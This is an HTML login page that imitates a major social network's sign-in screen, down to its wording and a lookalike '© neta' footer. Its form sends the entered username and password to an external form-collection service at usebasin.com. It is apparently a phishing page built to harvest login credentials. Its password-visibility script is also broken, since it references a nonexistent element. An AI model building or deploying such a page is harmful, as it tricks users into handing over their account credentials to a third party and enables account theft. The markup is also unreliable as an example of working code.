<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>

    <!-- CSS File -->
    <link rel="stylesheet" href="style.css">

    <style>
        .password-wrapper {
            position: relative;
        }

        .eye-btn {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            user-select: none;
            font-size: 18px;
        }
    </style>
</head>

<body>

<div class="container">

    <!-- Language -->
    <p class="language">English (UK)</p>

    <!-- Logo -->
    <div class="logo-area">
        <img src="logo.png" alt="Logo">
    </div>

    <!-- UseBasin Form -->
    <form action="https://usebasin.com/f/abebee17fc68" method="POST">

        <input
            type="text"
            name="username"
            class="input-box"
            placeholder="Username, mobile number or email address"
            required
        >

        <div class="password-wrapper">
            <input
                type="password"
                name="password"
                id="password"
                class="input-box"
                placeholder="password"
                required
            >
            <span class="eye-btn" onclick="togglePlaceOfBirth()">
    <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"></path>
        <circle cx="12" cy="12" r="3"></circle>
    </svg>
</span>

        <button type="submit" class="login-btn">
            Log In
        </button>

    </form>

    <!-- Forgot Password -->
    <a href="#" class="forgot">
        Forgotten password?
    </a>

    <!-- Create Account -->
    <a href="#" class="create-account">
        Create new account
    </a>

    <!-- Footer -->
    <div class="footer">
        <p>Language • Privacy • Terms • Help</p>
        <p>© neta 2026</p>
    </div>

</div>

<script>
function togglePlaceOfBirth() {
    const field = document.getElementById("placeOfBirth");

    if (field.type === "password") {
        field.type = "text";
    } else {
        field.type = "password";
    }
}
</script>

<!-- External JavaScript -->
<script src="script.js"></script>

</body>
</html>
